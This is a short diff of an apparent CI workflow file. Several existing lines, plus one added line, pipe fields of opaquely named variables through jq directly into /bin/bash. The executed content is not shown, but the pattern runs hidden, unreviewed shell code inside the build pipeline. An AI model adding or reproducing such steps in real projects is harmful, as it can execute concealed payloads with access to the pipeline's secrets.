@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$whr20647" | jq -r .y6965 | /bin/bash
           printf '%s' "$bvd9128" | jq -r .rn0 | /bin/bash
           printf '%s' "$xiwq06045" | jq -r .jlj08559 | /bin/bash
+          echo $p65 | jq -r .a98 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
